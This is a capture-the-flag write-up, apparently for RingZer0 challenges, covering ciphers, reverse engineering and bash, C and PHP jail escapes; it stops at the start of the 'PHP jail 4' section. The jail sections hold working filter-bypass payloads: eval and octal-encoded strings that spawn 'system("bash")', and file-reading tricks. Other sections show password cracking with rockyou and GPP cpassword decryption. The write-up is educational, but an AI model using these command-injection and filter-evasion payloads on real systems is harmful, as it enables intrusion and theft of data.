# Crypto

## Some martian message
I like to use the bsdgames linux package, which is available on most distros.  
<br>
It includes the utilities morse and caesar so you can easily use them on the command line or in shell scripts.
<br>
since I didn't know the shift,  I just ran
```assembly
for n in $(seq 1 26) ; do echo SYNTPrfneVfPbbyOhgAbgFrpher| caesar $n; done
```
```assembly
TZOUQsgofWgQcczPihBchGsqifs
UAPVRthpgXhRddaQjiCdiHtrjgt
VBQWSuiqhYiSeebRkjDejIuskhu
WCRXTvjriZjTffcSlkEfkJvtliv
XDSYUwksjAkUggdTmlFglKwumjw
YETZVxltkBlVhheUnmGhmLxvnkx
ZFUAWymulCmWiifVonHinMywoly
AGVBXznvmDnXjjgWpoIjoNzxpmz
BHWCYaownEoYkkhXqpJkpOayqna
CIXDZbpxoFpZlliYrqKlqPbzrob
DJYEAcqypGqAmmjZsrLmrQcaspc
EKZFBdrzqHrBnnkAtsMnsRdbtqd
FLAGCesarIsCoolButNotSecure   <--- Here is our flag
GMBHDftbsJtDppmCvuOpuTfdvsf
HNCIEguctKuEqqnDwvPqvUgewtg
IODJFhvduLvFrroExwQrwVhfxuh
JPEKGiwevMwGsspFyxRsxWigyvi
KQFLHjxfwNxHttqGzyStyXjhzwj
LRGMIkygxOyIuurHazTuzYkiaxk
MSHNJlzhyPzJvvsIbaUvaZljbyl
NTIOKmaizQaKwwtJcbVwbAmkczm
OUJPLnbjaRbLxxuKdcWxcBnldan
PVKQMockbScMyyvLedXydComebo
QWLRNpdlcTdNzzwMfeYzeDpnfcp
RXMSOqemdUeOaaxNgfZafEqogdq
SYNTPrfneVfPbbyOhgAbgFrpher
```
or just use any site..

![screenshot_20180727_152520](https://user-images.githubusercontent.com/22657154/43323369-1edc7914-91ba-11e8-8cc8-d5ae4470c3c9.png)

## File recovery

When you unzip the file from the site you are given one file that looks encrypted and a private key. This is like being trapped in a room with cookies and milk, you just know you need to use on the other in some way.

It seems like the goal was to use the private key on the encrypted file. I assumed the encrypted file used the public key.

I ran the below command and I had the flag.

```assembly
openssl rsautl -decrypt -inkey private.pem -in flag.enc -out plaintext.txt ; cat plaintext.txt
```
## You're drunk!
Since this is such a small point challenge we can just run through common ciphers
<br>
Doing this we find it is just a substitution cipher; solving with ```https://quipqiup.com/```  gives us a message

![screenshot_20180728_150205](https://user-images.githubusercontent.com/22657154/43356785-f11fe364-927f-11e8-9921-7eda5a66103e.png)

## Fashion victim

This challenge uses a interesting concept introduced by Adi Shamir and Moni Naor. 
Basically, the data will be visible by the superposition of two patterns formed by 
different pixel orientations.
<br>
firstly list the frames inside tv.gif

```assembly
┌─[✗]─[root@parrot]─[~/Desktop]
└──╼ #identify tv.gif 
tv.gif[0] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.010u 0:00.009
tv.gif[1] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.010u 0:00.009
tv.gif[2] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.010u 0:00.009
tv.gif[3] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.010u 0:00.009
tv.gif[4] GIF 1x1 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[5] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[6] GIF 1x1 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[7] GIF 1x1 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[8] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[9] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[10] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[11] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[12] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[13] GIF 1x1 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[14] GIF 1x1 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[15] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[16] GIF 1x1 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[17] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[18] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[19] GIF 1x1 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[20] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[21] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[22] GIF 1x1 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[23] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[24] GIF 1x1 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[25] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[26] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[27] GIF 1x1 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[28] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[29] GIF 1x1 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
tv.gif[30] GIF 492x360 492x360+0+0 8-bit sRGB 4c 340KB 0.000u 0:00.000
```
extract each frame to a png file 

```assmebly
┌─[root@parrot]─[~/Desktop]
└──╼ #convert tv.gif tv.png
```
combine each frame with the rest of frames 

```assembly
┌─[root@parrot]─[~/Desktop]
└──╼ #for i in `seq 0 30`; do for j in `seq 0 30`; do composite -gravity center -blend 50x50 ./tv-${i}.png ./tv-${j}.png tv-${i}-${j}.png; done; done
```
the combination between 17.png and 25.png gives the flag.

![11](https://user-images.githubusercontent.com/22657154/43357182-4b8962e8-9286-11e8-8be4-787ba3c8c07c.png)



## Martian message part 2
This is a classic example of a Vigenère cipher.
<br>
We know right off the bat it must be a polyalphabetic cipher because it comes with a key! 
<br>
The term Polyalphabetic means it uses multiple ciphers, one for each letter given in the key. That way a stream of "AAAAAA" would not just be translated "NNNNNN" 
<br>
So, knowing what type of cipher it is, we can go and use any online decryption tool..

![screenshot_20180727_151604](https://user-images.githubusercontent.com/22657154/43322849-966308a6-91b8-11e8-8e41-2b2d703389d9.png)


## Public key recovery
no need to explain..

```
openssl rsa -in priv.rsa -pubout 2> /dev/null | grep -v "^-" | tr -d '\n' | md5sum | cut -d "-" -f 1
```
![screenshot_20180727_164800](https://user-images.githubusercontent.com/22657154/43327881-465c9400-91c5-11e8-9ff1-467fec4cd3ed.png)


## I Lost my password can you find it?
to find the encrypted password
```assembly
┌─[root@parrot]─[~/Downloads/Policies]
└──╼ #grep -R -i "pass" | tr ' ' '\n' | grep -i pass
cpassword="PCXrmCkYWyRRx3bf+zqEydW9/trbFToMDx6fAvmeCDw"
```
i didn't know what is Cpassword at the first time but after googling ```cpassword decrypt``` i found this article : ```https://tools.kali.org/password-attacks/gpp-decrypt``` on a tool called ```gpp-decrypt```

back to terminal..
```assembly
┌─[root@parrot]─[~/Downloads]
└──╼ #gpp-decrypt PCXrmCkYWyRRx3bf+zqEydW9/trbFToMDx6fAvmeCDw 2> /dev/null
LocalRoot!
```

## Martian message part 3
After the two first martian challenges and this short alphanumeric text,
<br>
we can assume that it is still a message encrypted with an algorithm by simple substitution (ROT13, Vigenère...).
<br>
After some tests by known plaintext (FLAG, flag, Flag), I get nothing conclusive. But we can see that:
<br>
• the cipher is only composed of alphanumeric characters
<br>
• the number of characters for the cipher is a multiple of 4.
<br>
Perhaps the cipher is encoded with Base64...
<br>
We also see that ASCII values of first characters ("EOBD") are close to ASCII values of "FLAG-" keyword.
<br>
Thus it seems that only the least significant bits of ASCII values were changed. There surely has a simple XOR encryption. 
<br>
i wrote a simple python script to get the key then decrypt the flag.

```python
#!/bin/python

s = list("RU9CRC43aWdxNDsxaWtiNTFpYk9PMDs6NDFS".decode("base64"))
p = list("FLAG")

# check for key
for j in range(0,4):
   for i in range(0,250):
      if chr(ord(s[j]) ^ i) == p[j]:
          print(chr(ord(s[j])) + "\tKEY\t" + str(i))
          key = i
          break

flag = ""

# decrypt the flag 
for i in s:
   flag += chr(ord(i) ^ key)

print("")
print(flag)
```

## Hangovers and more: Bacon
It is clear from the title of this challenge that this is a bacon cipher.

```assembly
┌─[root@parrot]─[~/Downloads]
└──╼ #echo "VoiCI unE SUpeRbe reCeTtE cONcontee pAR un GrouPe d'ArtistEs culinaiRe, dONT le BOn Gout et lE SeNs de LA cLasSe n'est limIteE qUe par LE nombre DE cAlOries qU'ils PeUVEnt Ingurgiter. Ces virtuoses de la friteuse vous presente ce petit clip plein de gout savoureux" |
sed "s/[ .,']//g" | # remove any " " && "," && "." && "'"
sed "s/[ABCDEFGHIJKLMNOPQRSTUVWXYZ]/B/g" | # replace uppercase letters with B
sed "s/[abcdefghijklmnopqrstuvwxyz]/A/g"   # replace lowercase letters with A

BAABBAABBBAABAAAABABABABBAAAAAAABBAABAAABAABAAAAABAAAAAAAABAABBBAABBABAAAAAABBABAAABBABAABAAAAAAAABAABABAAAABBAAAAAABBABABAAAAABAAABABBBAABAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
┌─[root@parrot]─[~/Downloads]
└──╼ #
```
Copy / Paste the A&B string into ```https://www.dcode.fr/chiffre-bacon-bilitere```

## Crypto object

The code on the ribbon is:
```assembly
GMODCDOOKCDBIOYDRMKDPQLDPVWYOIVRVSEOV
```
Which means nothing, so I rot13'd it 'til the letters looked right (Conatins F, L, A and G).
```assemlby
WCETSTEEASTRYEOTHCATFGBTFLMOEYLHLIUEL
```
But that didn't do much, until I stumbled on scytale coding.
With 3 turns we get:
```assembly
WELCOMETOTHESCYTALETHEFLAGISBUTTERFLY
```

## Encrypted ZIP
we don't have to use known plain text attack, just use rockyou!

```assemlby
┌─[✗]─[root@parrot]─[/tmp]
└──╼ #fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt flag.zip 
found file 'flag.txt', (size cp/uc     41/    29, flags 1, chk 5851)


PASSWORD FOUND!!!!: pw == testtest
```

## Is it a secure string?
after googling ```secure strings decrypt``` i found these references
```
https://blogs.msdn.microsoft.com/besidethepoint/2010/09/21/decrypt-secure-strings-in-powershell/
```
```
https://blogs.msdn.microsoft.com/timid/2009/09/10/powershell-one-liner-decrypt-securestring/
```
and it was a ```powershell``` task.

```powershell
$encrytedFlag = '76492d1116743f0423413b16050a5345MgB8AEEAYQBNAHgAZQAxAFEAVABIAEEAcABtAE4ATgBVAFoAMwBOAFIAagBIAGcAPQA9AHwAZAAyADYAMgA2ADgAMwBlADcANAA3ADIAOQA1ADIAMwA0ADMAMwBlADIAOABmADIAZABlAGMAMQBiAGMANgBjADYANAA4ADQAZgAwADAANwA1AGUAMgBlADYAMwA4AGEAZgA1AGQAYgA5ADIAMgBkAGIAYgA5AGEAMQAyADYAOAA='

$key = (3,4,2,3,56,34,254,222,205,34,2,23,42,64,33,223,1,34,2,7,6,5,35,12)

$SecureFlag = ConvertTo-SecureString -String $encrytedFlag -Key $key

[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureFlag))
```



# RE

## Time to learn x86 ASM & gdb

![1](https://user-images.githubusercontent.com/22657154/43359576-09b2e228-92ad-11e8-8cb2-b1209b717c63.png)

## I never forget the Nintendo 64

![2](https://user-images.githubusercontent.com/22657154/43359577-09e17a48-92ad-11e8-8386-adcc24991e1c.png)


## Can you see through the star

![3](https://user-images.githubusercontent.com/22657154/43360107-edd6e4fc-92af-11e8-9d54-b4aef880fbaa.png)

## Windows x86 reversing is cool

![4-1](https://user-images.githubusercontent.com/22657154/43360108-ef3a0518-92af-11e8-9e67-d6357745139a.png)

![4-2](https://user-images.githubusercontent.com/22657154/43360109-efb11f5e-92af-11e8-8b6d-cc4ea3c75b2f.png)

## Introduction to ARM
this was a very basic arm challenge you can just decompile it with ida and combine the two strings you have

![arm](https://user-images.githubusercontent.com/22657154/43360111-f0cc44fe-92af-11e8-9872-0951635796ee.png)

but there is more intersting way..
<br>
first install retdec decompiler, you can follow these instractions here : ```blog.simos.info/installing-retdec-on-ubuntu/```
<br>
decompile and modify the C source you got, then recompile it using ```gcc -m32 source.c```
<br>
here is my C source 
```C
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char ** argv) {
    int * mem = malloc(12);
    int v1 = (int)mem;
    *mem = (int)malloc(10);
    memset((int *)*mem, 0, 10);
    int * mem2 = malloc(10);
    int * str2 = (int *)(v1 + 4);
    *str2 = (int)mem2;
    memset((int *)*str2, 0, 10);
    int * mem3 = malloc(12);
    int * str = (int *)(v1 + 8);
    *str = (int)mem3;
    memset((int *)*str, 0, 12);
    int *str3 = malloc(100) ;
    scanf("%s", &str3);
    memcpy((int *)*mem, (int *)"AEe04", 6);
    memcpy((int *)*str2, (int *)"fgB37", 6);
    strcpy((char *)*str, (char *)*mem);
    strcat((char *)*str, (char *)*str2);
    int strcmp_rc = strcmp((char *)*str, (char *)&str3);
    int re = strcmp_rc; // fix error

    if (strcmp_rc == 0) {
        printf("FLAG-3jk3%s\n",(char *)*str);
    } else {
        printf("Wrong Password!\n");
    }
    free(mem);
    return 0;
}
```
```assembly
┌─[root@parrot]─[~/Downloads]
└──╼ #./arm.bin 
testtest
Wrong Password!
┌─[root@parrot]─[~/Downloads]
└──╼ #ltrace ./arm.bin 
....                                      
memcpy(0x57ffc170, "AEe04\0", 6)                                                                        = 0x57ffc170
memcpy(0x57ffc180, "fgB37\0", 6)                                                                        = 0x57ffc180
strcpy(0x57ffc190, "AEe04")                                                                             = 0x57ffc190
strcat("AEe04", "fgB37")                                                                                = "AEe04fgB37"
strcmp("AEe04fgB37", "1234")                                                                            = 1
puts("Wrong Password!"Wrong Password!
)                                                                                 = 16
free(0x57ffc160)                                                                                        = <void>
+++ exited (status 0) +++
┌─[root@parrot]─[~/Downloads]
└──╼ #./arm.bin 
AEe04fgB37
FLAG-3jk3AEe04fgB37
```


## Crackme 1 
Executing the binary only shows some message about Windows history and then exits.
Disassembling it reveals that, before showing the message, it loads a resource and writes it to a file.

![crackme1](https://user-images.githubusercontent.com/22657154/43521729-63ab4d8c-9597-11e8-89ec-af383dfbb66c.png)

Opening the file in PE-Studio shows only one resource file
Dump it to a file and open this one in PE-Studio. This reveals, that it's a DLL.

![crackme1-2](https://user-images.githubusercontent.com/22657154/43521955-0e440680-9598-11e8-9f88-b73e1913d5a9.png)

![crackme1-](https://user-images.githubusercontent.com/22657154/43521999-32acdd62-9598-11e8-8974-d3b232cd582a.png)

It exports only one symbol [DisplayMessage], calling this one directly reveals the flag
```
rundll32 dump.dll,DisplayMessage
```

![v](https://user-images.githubusercontent.com/22657154/43522120-a5fe787a-9598-11e8-8481-ac7f1e99c264.png)

# Kernel introduction

I opened it with IDA, strings are embedded, and some routines pass.
<br>
And then, after passing through all the routines, it prints the result of the operation.

![untitled](https://user-images.githubusercontent.com/22657154/43524589-f568c940-959f-11e8-89df-39fab5229984.png)

So if you code this code similarly, you'll get a flag!

```C
#include <string.h>
#include <stdio.h>

int  main (void){
    char key[1024] = "28714143kkl23jlsdkj34hji53jhk345khj543jhk354h354jh354jhkl354jhkl354hjk345hjk3h4i5h3l4h5iul34u6h4e5uh7ui5h7uilyhhiuyhuileyhlui6yhuilyuhil55hhuilhiw543uhiw34uhihuiuh6iwl354h" ;
 
    char buffer[34] = {0x76 , 0x34, 0x71, 0x76, 0x4f, 0x4c, 0x7b, 0x42, 0x0e, 0x5e, 0x06, 0x4e, 0x02, 0x72, 0x50, 0x01, 0x53, 0x07, 0x0c, 0x34, 0x06, 0x4b, 0x07, 0x04, 0x2a, 0x61, 0x0a, 0x66, 0x73, 0x53, 0x03, 0x4e, 0x04, 0x00};
 
    int  v5 = atoi(key);
    int  v0  =  0, v6 = 0 , v1 = 0, v3 = 0, i, j;
    char  v7;
    char output[1024];
    v1 = key;
 
    for (i  = 256 ; i;  --i){
        v1 = 0 ;
        v1 += 4 ; 
    }

    v3 = output;
    for (j = 256 ; j; --j){
        v3 = 0;
        v3 += 4;
    }

    sprintf(key,  "0x%08x" , v5);
    while (v0 < strlen(buffer)){
        v7 = key[v6++];
        sprintf (output, "%s%c" , output, v7 ^ buffer[v0]);
        if (v6 == strlen(key)){
        	v6 = 0;
        }
        ++v0;
    }
    printf("<1>%s \n" , output);
    return 0;
}
```

![repel](https://user-images.githubusercontent.com/22657154/43524591-f5fae38e-959f-11e8-864d-9a9b51eed13e.png)

# Wrong byte!
Nothing intersting inside the binary, just assigning values to local variables then calling ```rax``` register and printing some random values..
<br>
using bash and python we can get the xor key and decode the flag

```bash
./chl.bin | hexdump -C | cut -d " " -f2- | cut -d '|' -f1 |  grep -v 00000 | tr -d '\n'  | sed 's/ / 0x/g' | sed 's/0x //g' | sed 's/0x$//g' | sed 's/^ //g' | sed 's/ /,/g' | sed 's/,$//g' ; echo
```

```python
arr = [0x1f,0x15,0x18,0x1e,0x74,0x1c,0x30,0x0d,0x14,0x23,0x2c,0x33,0x16,0x29,0x17,0x2e,0x00,0x1a,0x3c,0x3c,0x2b,0x2f,0x08,0x14,0xf,0x36,0x3d,0x69,0x31,0x34,0x03,0x11,0x1a,0x19,0x00,0x7f]
flag = ""

for i in arr:
    flag += chr(i ^ 89)
print flag
```
![screenshot at 2018-08-02 21-14-12](https://user-images.githubusercontent.com/22657154/43606051-92690048-969a-11e8-836d-4198c373571f.png)

# Heap allocator
You can read this writeup for more details ```blog.dornea.nu/2016/11/30/ringzer0-ctf-binaries-heap-allocator/```
<br>
using static analysis we can figure out that function ```__libc_csu_ctor``` will print the flag if ```al``` is equal to ```0xcc``` 
open up ```radare2``` and get the flag

![screenshot at 2018-08-02 22-10-02](https://user-images.githubusercontent.com/22657154/43609372-181d7968-96a4-11e8-99a3-c94b99574edf.png)

![screenshot at 2018-08-02 22-27-41](https://user-images.githubusercontent.com/22657154/43609376-1b22cdac-96a4-11e8-9ee2-b42040973621.png)

## Windows API for the win 
After solving the challenge i found this write up which explains the whole idea behind the binary just using static analysis
<br>
so i'm just going to copy paste it.
```assembly
There are actually 2 (at least) ways to do the challenge, the lazy way (olly anti-anti-debug patched)
or with analysis of what's actually happening, I'll show you the latter
~~~
Opening the file in IDA, checking for some interesting functions, I saw strlen, so I jumped there (0x401588)
and saw there that before that, 6 characters are collected through 6 different functions, that our
6-character password is xored with these six characters, and that the result is compared, through the
strcmp function, with another value - that we'll find later - stored in memory.

About the 6 characters, in IDA I can see 6 functions, _GetK1 till _GetK2, calling WinAPI, and stocking the 
result on stack, and there will be the xor key for our input.

*_GetK1 :
	The function calls SetThreadContext(0, NULL) - which is invalid - and gets the error value in eax (with GetLastError).
	You can debug this part, or search a bit to find that the function will fail because the handle sent as parameter is
	0, which is an invalid handle, so the error should be ERROR_INVALID_HANDLE, or 0x06. After, 2 is added, to give
	the first character of the key (0x08).

*_GetK2 :
	The function calls IsDebuggerPresent(). Obviously, we want the result to be no, which is 0x0. Anyways, the result is
	meaningless. The next function called is GetLastError(), and because IsDebuggerPresent() hasn't caused any error, the
	error code should still be 0x06. Then, the operation 0x06-0x3E is done to give 0xFFFFFFC8, then C8 is the second character.

*_GetK3 :
	This function does basically the same thing as _GetK1, but instead of calling SetThreadContext(0, NULL) it calls
	GetThreadContext(0, NULL). After, it adds 0x12 to the returned error value (0x06), to give 0x18 as the 3rd character.

*_GetK4 :
	Again, this function calls GlobalFree(NULL), where NULL is obviously an invalid handle, and GetLastError() then returns
	0x06. If 0x22 is added to it, then the 4th character is 0x28.

*_GetK5 :
	This function calls IsBadCodePtr(NULL) - which is, by the way, a terrible function - and GetLastError() returns also
	0x06, ERROR_INVALID_HANDLE. The 5th character is then 0x06-0x4E = 0xFFFFFFB8 => B8.

*_GetK6 :
	Finally, again, GlobalHandle(NULL) is called, which is invalid, thus having the error code 0x06, thus having the 6th
	character to be 0x06-0x1E = 0xFFFFFFE8 => E8.

Thus, the xor key is : 0x08 0xC8 0x18 0x28 0xB8 0xE8. Now, we need to find the special value with which our input will be 
compared with, to find the real password to enter : XORED_PASSWD (we'll find) ^ XOR_KEY (we have) = PASSWD (good input).

Concerning the "secret" value, used as input in strcmp, we can see at addresses 0x4014E5-0x4014F8, that 7 characters are
copied from address 0x403065, which contains 0x3B 0xFC 0x73 0x69 0xF9 0xDA 0x00 (wasn't that secret finally...).

Finally, we can find the input required! We xor this with the 6 characters found previously :
	0x08 0xC8 0x18 0x28 0xB8 0xE8
^	0x3B 0xFC 0x73 0x69 0xF9 0xDA
--------------------------------------
	0x33 0x34 0x6B 0x41 0x41 0x32

Which gives (in ASCII) : 34kAA2

We then enter this as the password and get :

---------------------------------
Password:34kAA2
FLAG-l2nxcas98q23m6spoqy32k12pa
---------------------------------

Got it!

@pwndr3
```
the other way that he didn't discuss so i will, is how to get the key using dynamic analysis
<br>
which can be summed up in just a picture.

![untitled](https://user-images.githubusercontent.com/22657154/43682609-261d0998-987a-11e8-984b-0a9066cc0f96.png)

## RingZer0 Authenticator
```python
#!/usr/bin/python2

i = 0
c = [ [] for x in range(5) ]
for s in "\x98\x97\x78\x0f\x15":
    for x0 in range(0, 10):
        for x1 in range(0, 10):
            for x2 in range(0, 10):
                b = (186*x0 - x1 + 13*x2 + 48) & 0xff
                if (b == ord(s)):
                    c[i].append(str(x0) + str(x1) + str(x2))
    i += 1

for a0 in c[0]:
    for a1 in c[1]:
        for a2 in c[2]:
            for a3 in c[3]:
                for a4 in c[4]:
                    print a0 + a1 + a2 + a3 + a4


'''
 - username = "RingZer0"
 - auth code length is 15 characters
 - auth code characters are only numbers
 - auth code string is divided into five 3-char blocks: {1,2,3},{4,5,6},{7,8,9},{10,11,12},{13,14,15}
 - each block is validated against checksums 0x98, 0x97, 0x78, 0x0f, 0x15, respectively.
 - checksum is calculated as the low byte of the linear combination (186 * x0 - x1 + 13 * x2 + 48) for each blocks represented as {x0, x1, x2}.
 - auth code is accepted if and only if the checksums are matching.
'''
```

# Jail Escaping
```
http://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash/
```

## bash jail 1
You can spawn a shell using ```bash```
Although you can't read (you could redirect stdout to stderr) files, you can try to run commands based on the file content

![jail1](https://user-images.githubusercontent.com/22657154/43360121-26199ee0-92b0-11e8-97f4-0e92220b8a76.png)

## bash jail 2 
Since you are not allowed to use certain characters like ";", "&", "]", "b", "d" and so on,
<br>
you must think of some way to read content of /home/level2/flag.txt
- payloads:
```bash
hello|cat${IFS%?}/home/level2/flag.txt
```
```bash
hello|cat<flag.txt
```
```bash
`</home/level2/flag.txt`
```

![jail2](https://user-images.githubusercontent.com/22657154/43360122-264aa3dc-92b0-11e8-91d3-fc1282eec2a3.png)

## bash jail 3
The problem here is that stderr is being redirected to /dev/null:
```assembly
WARNING: this prompt is launched using ./prompt.sh 2>/dev/null
```
The 2nd problem is that stdout and stderr are also redirected to /dev/null:
```assembly
output=`$input` &>/dev/null
```
But fortunately we are allowed to use eval (which doesn't match against the regexp in check_space)

```bash
eval uniq flag.txt 
```
this would cause an error since the shell cannot execute the command associated with the content in the flag file.
<br>
But since stderr is redirected I had to redirect again to sth else, like stdin (0):

![jail3](https://user-images.githubusercontent.com/22657154/43360268-1a5cf43c-92b3-11e8-8dc6-b44f63ee5ce8.png)

## bash jail 4
Since a lot of characters are not allowed, stdout/stderr redirection is not working anymore.
<br>
And regarding < /dev/null: This is mostly used to detach a process from a tty.
<br>
That means we are allowed to launch some daemons. After some try & failure I thought of starting some web server
<Br> 
and then "downloading" the flag file using a GET request.

![jail5](https://user-images.githubusercontent.com/22657154/43361356-44a3fba6-92d5-11e8-9b73-4d1a5e529000.png)

## bash jail 5 
- Use bash magic voodoo
```assembly
┌─[✗]─[root@parrot]─[~/CTFs]
└──╼ #`echo echo {o..q}ython\\;`
oython; python; qython;
┌─[root@parrot]─[~/CTFs]
└──╼ #eval `echo echo {o..q}ython\\;`
oython
Python 2.7.15 (default, May  1 2018, 05:55:50) 
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```

![screenshot_20180729_011221](https://user-images.githubusercontent.com/22657154/43361354-2b9f7c20-92d5-11e8-928a-c812857a2cd9.png)

## C Jail 1,2,3
I'm not really an expert in C jail escaping but using this payload:
```C
%:include "/home/level{level_number}/flag.txt"
```
we can get the first three flags..
<br>
the program will try to include the flag and fail giving us the flag content as a compliling error.

```C
Compiling your code.
In file included from /tmp/9868f2af-14a6-42cb-a06f-9f9916e8b294/bin.c:13:0:
/home/level2/flag.txt: In function ‘_a7271eb818f091c987f823fe9d8dede9’:
/home/level2/flag.txt:1:1: error: ‘FLAG’ undeclared (first use in this function)
 FLAG-0416ewrN2o058901Aqf4w9hsyH0dfqzd
 ^
/home/level2/flag.txt:1:1: note: each undeclared identifier is reported only once for each function it appears in
/home/level2/flag.txt:1:6: error: exponent has no digits
 FLAG-0416ewrN2o058901Aqf4w9hsyH0dfqzd
      ^
/tmp/9868f2af-14a6-42cb-a06f-9f9916e8b294/bin.c:15:1: error: expected ‘;’ before ‘}’ token
 }
 ^
 ```

## PHP Jail 1
```php
<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(`|open|exec|pass|system|\$|\/)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>
```
We see the PHP code used for the jail. That facilitates a lot of things.
<br>
Above the eval instruction is used to evaluate and execute the input data.
<br>
But some characters and keywords are prohibited for these input data.
<br>
However there is more than one way to solve this challenge.
```php
readfile('flag.txt');
FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
```
```php
include('flag.txt');
FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
```
```php
require('flag.txt');
FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
```
```php
eval('sys'.'tem("bash");');
level1@lxc20-php-jail:~$ cat flag.txt
FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
```
```php
assert('sys'.'tem("bash")');
level1@lxc20-php-jail:~$ cat flag.txt
FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
```

## PHP jail 2 
```php
<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(\/|a|c|s|require|include|flag|eval|file)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>
```
Again we see the PHP code used for the jail.
And again the eval instruction is used to evaluate and execute the input data and some
keywords and characters are prohibited for these input data.
With these prohibited keywords and characters, I can not use my solutions of the previous
PHP jail challenge.
We must find another way. There are numerous ways in particular. Here I suggest using
any PHP function.
Firstly we can use hexadecimal or octal strings which will be decoded using double quoted
strings. So any string can be used for our PHP code in input data. Because of prohibited
characters, the octal strings are better.
Secondly we can use PHP variables (the dollar sign is not prohibited). So we can do a
dynamic call of PHP function using a function name in a string variable.

```assembly
┌─[root@parrot]─[~]
└──╼ #cat /usr/bin/phpjail
echo -n $1 | hexdump -ve '"\\\\" /1 "%o"' ; echo
┌─[root@parrot]─[~]
└──╼ #phpjail system
\\163\\171\\163\\164\\145\\155
┌─[root@parrot]─[~]
└──╼ #phpjail bash
\\142\\141\\163\\150
```
```assembly
$f = "\\163\\171\\163\\164\\145\\155" ; $f("\\142\\141\\163\\150");
level2@lxc20-php-jail:~$ cat flag.txt
FLAG-YlxV8cCg84zvUtt595dla5un9EW57BCL
```

![screenshot at 2018-08-09 17-10-16](https://user-images.githubusercontent.com/22657154/43908249-c7dec0fc-9bf7-11e8-8c29-49b73ca48061.png)

# PHP jail 3 
```php
<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
	if(preg_match('/(`|\.|\$|\/|a|c|s|require|include)/i', $var)) {
		return false;
	}
	return true;
}
if(filter($var)) {
	eval($var);
	echo "Command executed";
} else {
	echo "Restricted characters has been used";
}
echo "\n";
?>
```
```assembly
┌─[root@parrot]─[~]
└──╼ #phpjail /home/level3/flag.txt
\\57\\150\\157\\155\\145\\57\\154\\145\\166\\145\\154\\63\\57\\146\\154\\141\\147\\56\\164\\170\\164
```
```assembly
highlight_file("\\57\\150\\157\\155\\145\\57\\154\\145\\166\\145\\154\\63\\57\\146\\154\\141\\147\\56\\164\\170\\164");
<code><span style="color: #000000">
FLAG-D6jg9230H05II3ri5QB7L9166gG73l8H
```
```assembly
print join(gzfile("\\57\\150\\157\\155\\145\\57\\154\\145\\166\\145\\154\\63\\57\\146\\154\\141\\147\\56\\164\\170\\164"));
FLAG-D6jg9230H05II3ri5QB7L9166gG73l8H
```
```assembly
print join(gzfile(glob("*")[0]));
FLAG-D6jg9230H05II3ri5QB7L9166gG73l8H
```

## PHP jail 4
i used hex encoding this time

```assembly
